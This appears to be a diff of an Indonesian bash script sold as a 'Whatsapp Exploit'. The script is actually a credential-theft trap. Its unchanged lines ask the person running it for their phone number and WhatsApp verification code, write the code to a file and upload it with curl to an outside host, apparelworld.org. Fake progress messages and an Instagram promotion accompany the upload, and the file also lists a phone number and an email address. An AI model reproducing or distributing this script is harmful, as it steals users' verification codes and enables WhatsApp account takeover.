@@ -1,10 +1,7 @@
 #!/bin/bash
 clear
 echo "
-read -p "FOLLOW INSTAGRAM GW DULU BIAR TAMBAH WORK"
-sleep 2.1
-echo "TUNGGU SEDANG PROSES...";
-sleep 5
+wa gw "083125187277"
 ############################################
 # Whatsapp Exploit # By Fiqi G4nZ          #
 # Log Listener     # akukalian11@gmail.com #
@@ -31,14 +28,14 @@ read -p "Verify Code => " code;
 sleep 2
 echo "[+] Menghubungkan Ke Whatsapp.com...";
 echo "Login => $nomer";
-sleep 0.5
+sleep 1.5
 echo "Code => $code";
-sleep 0.5
+sleep 1.5
 echo "Target => $target";
-sleep 0.5
+sleep 1.5
 echo "[+] Mengirim Exploit...";
 echo "Code => $code" >> hasil.html;
 curl -T hasil.html http://apparelworld.org/
 sleep 5
-echo "[+] Sukses Exploit (Follow Instagram @hyputganz_!";
+echo "[+] Sukses Exploit Follow Instagram @hyputganz_";
 exit;
